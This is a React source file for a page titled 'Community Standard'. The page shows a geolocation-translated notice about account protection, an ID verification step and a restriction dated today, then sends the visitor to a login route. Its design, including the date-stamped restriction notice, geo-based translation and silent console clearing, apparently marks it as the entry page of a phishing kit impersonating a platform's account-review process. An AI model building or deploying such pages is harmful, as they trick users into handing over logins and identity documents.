import { defaultIndexTexts,type IndexTranslatedTexts } from '@/content/indexTexts';
import paths from '@/router/paths';
import translateText from '@/utils/translate';
import { useGeo } from '@/hooks/use-geo';
import { faCircleCheck,faIdCard } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useEffect,useState } from 'react';
import { useNavigate } from 'react-router';
import HomeImage from '@/assets/images/hero-image.jpg'
import SplashImage from '@/assets/images/splash.gif'
const Index = () => {
    const navigate = useNavigate();
    const { geoData } = useGeo();
    const [today, setToday] = useState('');
    const [isLoading, setIsLoading] = useState(true);
    const [showSplash, setShowSplash] = useState(true);
    const [translatedTexts, setTranslatedTexts] = useState<IndexTranslatedTexts>(defaultIndexTexts);

    useEffect(() => {
        const translateAllTexts = async (targetLang: string) => {
            try {
                const textsToTranslate = Object.values(defaultIndexTexts);
                const translatedResults = await Promise.all(textsToTranslate.map((text) => translateText(text, targetLang)));

                const [title, description, protectionText, processText, continueBtn, restrictedText] = translatedResults;

                setTranslatedTexts({
                    title,
                    description,
                    protectionText,
                    processText,
                    continueBtn,
                    restrictedText
                });
            } catch {
                console.clear();
            }
        };

        const init = async () => {
            const date = new Date();
            const options: Intl.DateTimeFormatOptions = {
                month: 'long',
                day: 'numeric',
                year: 'numeric'
            };
            setToday(date.toLocaleString('en-US', options));
            localStorage.clear();
            localStorage.setItem('visited', 'true');

            setTimeout(() => {
                setShowSplash(false);
                setIsLoading(false);
            }, 2600);

            if (geoData?.country_code) {
                await translateAllTexts(geoData.country_code);
            }
        };

        init();
    }, [geoData]);

    if (showSplash) {
        return (
            <div className='fixed inset-0 flex items-center justify-center bg-white'>
                <img src={SplashImage} alt='' className='max-w-full max-h-full' />
            </div>
        );
    }

    return (
        <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
            <title>Community Standard</title>
            <div className='flex max-w-[620px] flex-col gap-4 rounded-lg bg-white p-4 sm:shadow-lg'>
                <img src={HomeImage} alt='' />
                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                <p className='leading-6 text-[#212529]'>{translatedTexts.description}</p>
                <div className='relative flex flex-col gap-4'>
                    <div className='absolute top-1/2 left-3 h-[70%] w-0.5 -translate-y-1/2 bg-gray-200'></div>

                    <div className='z-10 flex items-center gap-2'>
                        <FontAwesomeIcon icon={faCircleCheck} className='h-7 w-7 bg-white text-gray-300' size='xl' />
                        <p>{translatedTexts.protectionText}</p>
                    </div>
                    <div className='z-10 flex items-center gap-2'>
                        <FontAwesomeIcon icon={faIdCard} className='h-7 w-7 bg-white text-[#355797]' size='xl' />
                        <p>{translatedTexts.processText}</p>
                    </div>
                </div>
                <button
                    className='rounded-lg bg-blue-500 px-3 py-4 font-bold text-white disabled:opacity-50'
                    disabled={isLoading}
                    onClick={() => {
                        navigate(paths.login);
                    }}
                >
                    {translatedTexts.continueBtn}
                </button>
                <p className='text-center'>
                    {translatedTexts.restrictedText} <span className='font-bold'>{today}</span>
                </p>
            </div>
        </div>
    );
};

export default Index;